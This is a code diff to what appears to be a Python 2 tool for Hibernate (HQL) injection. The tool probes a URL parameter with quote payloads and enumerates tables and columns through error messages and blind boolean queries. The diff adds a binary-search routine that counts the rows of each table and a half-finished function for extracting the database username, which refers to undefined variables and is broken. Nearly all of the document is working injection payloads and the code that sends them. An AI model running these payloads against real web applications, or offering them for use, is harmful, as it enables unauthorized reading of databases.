@@ -1,5 +1,6 @@
-from urlparse import urlparse, parse_qs
+import urlparse
 from bs4 import BeautifulSoup
+from math import *
 import urllib
 import optparse
 import requests
@@ -22,11 +23,9 @@ def send_HTTP_request(url, params):
     return req
 
 def check_if_host_vulnerable(url, params, param_to_test):
-    params[param_to_test][0] = "'"
+    params[param_to_test] = "'"
 
-    # print params
     req = send_HTTP_request(url, params)
-    # print req.content
     if ('org.hibernate.QueryException' in req.content):
         print "Host seems vulnerable."
     else:
@@ -36,11 +35,9 @@ def list_columns(url, params, param_to_test):
 
     global TABLES
     columns = []
-    params[param_to_test][0] = "' and test=1 and ''='"
+    params[param_to_test] = "' and test=1 and ''='"
 
-    # print params
     req = send_HTTP_request(url, params)
-    # print req.content
     if ('not found; SQL statement' in req.content):
         # pattern for the columns
         pattern = re.compile(r'(([a-zA-Z_-]+)[0-9]+_\.([a-zA-Z0-9_-]+)\s)')
@@ -90,8 +87,7 @@ def blind_hqli_injection_tables(url, params, param_to_test, file_table, blind_hq
     # removing new line
     for table in tables_to_test:
         table = remove_new_line_from_string(table)
-        params[param_to_test][0] = "'and (select test from " + table + " where test = 1) >= 'p' or ''='"
-        # print params[param_to_test][0]
+        params[param_to_test] = "'and (select test from " + table + " where test = 1) >= 'p' or ''='"
         req = send_HTTP_request(url, params)
         if (table_exists(req.content)):
             insert_table_name_in_tables(table)
@@ -109,13 +105,58 @@ def blind_hqli_injection_columns(url, params, param_to_test, file_column, blind_
         for column in columns_to_test:
             # removing new line
             column = remove_new_line_from_string(column)
-            params[param_to_test][0] = "'and (select count(w." + column + ") from " + table + " w) >= 0 or ''='"
+            params[param_to_test] = "'and (select count(w." + column + ") from " + table + " w) >= 0 or ''='"
             
             req = send_HTTP_request(url, params)
             if (column_exists(req.content)):
                 insert_column_in_table(table, column)
             else:
                 display_message("[-] Column " + column + " does not exist.")            
+
+def get_dbms_username(url, params, param, message):
+    global TABLES
+
+    table_to_test = TABLES[0]
+    params[param_to_test] = "' and (SELECT length(CONCAT(COUNT(*), '/', USER())) FROM User) >= 4 or ''='"
+
+    count_table = get_count_of_table(url, params, param, message, tables_to_test)
+    payload = str(count_table) + '/' 
+
+
+def get_count_of_tables(url, params, param, message):
+    global TABLES
+
+    for table in TABLES:
+        get_count_of_table(url, params, param, message, table)
+
+def get_count_of_table(url, params, param_to_test, message, name_table):
+    global TABLES
+
+    table_to_test = name_table
+    inf = 0
+    sup = 10
+
+    while (inf != sup):
+
+        inf_str = '{:g}'.format(inf)
+        sup_str = '{:g}'.format(sup)
+
+        params[param_to_test] = "' and (SELECT count(*) FROM " + table_to_test + ") = " + inf_str + " or ''='"
+        req = send_HTTP_request(url, params)
+
+        if (message in req.content):
+            break
+    
+        params[param_to_test] = "' and (SELECT count(*) FROM " + table_to_test + ") >= " + sup_str + " or ''='"
+        req = send_HTTP_request(url, params)
+
+        if (message in req.content):
+            inf = sup
+            sup = (2 * inf)
+        else:
+            sup = sup - floor((sup-inf)/2)
+
+    print "[!] Count(*) of " + table_to_test + " : " + '{:g}'.format(inf)
 
 
 def insert_table_name_in_tables(table_name):
@@ -164,6 +205,7 @@ parser.add_option('--cookie', help='Cookie to test it', dest='cookie', default=N
 parser.add_option('--blind', help='Message appearing while Blind HQLi', dest='blind_hqli_message', default=None)
 parser.add_option('--table_name_file', help='Name for tables', dest='file_table', default='db/tables.db')
 parser.add_option('--column_name_file', help='Name for columns', dest='file_column', default='db/columns.db')
+parser.add_option('--fingerprinting', help='Gathers information by doing fingerprinting', dest='fingerprinting', default=False, action='store_true')
 parser.add_option('--results', help='Enumerate results after session', dest='results', default=False, action='store_true')
 parser.add_option('--verbose', help='Verbose mode', dest='verbose', default=False, action='store_true')
 
@@ -180,20 +222,28 @@ else:
     VERBOSE_MODE = opts.verbose
 
     # check for param
-    params = parse_qs(urlparse(opts.url).query)
+    params = opts.url.split('?')[1]
+    params = dict( (k, v if len(v)>1 else v[0] ) 
+           for k, v in urlparse.parse_qs(params).iteritems() )
+    # print params
+    # raw_input()
     if (opts.param not in params):
         raise Exception('Param not in URL!')
 
     url = opts.url.split('?')[0]
     check_if_host_vulnerable(url, params, opts.param)
 
-   # list columns
+    # list columns
     list_columns(url, params, opts.param)
 
     # check if blind hql injection must be done
     if (opts.blind_hqli_message is not None):
         blind_hqli_injection_tables(url, params, opts.param, opts.file_table, opts.blind_hqli_message)
         blind_hqli_injection_columns(url, params, opts.param, opts.file_column, opts.blind_hqli_message)
+
+        if (opts.fingerprinting):
+            get_count_of_tables(url, params, opts.param, opts.blind_hqli_message)
+            # get_dbms_username(url, params, opts.param, opts.blind_hqli_message)
 
     # enumerate tables and columns found if flag passed
     if (opts.results):
